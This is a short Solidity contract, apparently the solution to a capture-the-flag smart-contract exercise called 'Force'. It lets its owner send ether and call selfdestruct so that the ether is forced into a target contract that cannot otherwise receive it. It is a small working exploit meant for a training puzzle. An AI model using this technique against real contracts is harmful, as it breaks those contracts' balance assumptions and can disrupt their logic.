// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceSolution {
  address payable forceContract;
  address private owner; 

  constructor(address payable _force) public {
    forceContract = _force;
    owner = msg.sender;
  }

  function forceThem() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1, "Not enough eth");
    selfdestruct(forceContract);
  }
}